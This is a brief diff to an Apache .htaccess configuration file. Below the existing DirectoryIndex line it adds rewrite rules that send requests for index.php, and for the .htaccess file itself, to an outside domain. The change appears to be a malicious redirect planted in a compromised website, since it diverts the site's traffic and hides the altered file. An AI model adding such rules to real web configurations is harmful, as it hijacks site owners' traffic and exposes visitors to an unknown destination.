@@ -1,1 +1,5 @@
 DirectoryIndex index.html
+
+RewriteEngine on
+RewriteRule (.*)index\.php https://hausz.stream/
+RewriteRule (.*)\.htaccess https://hausz.stream/
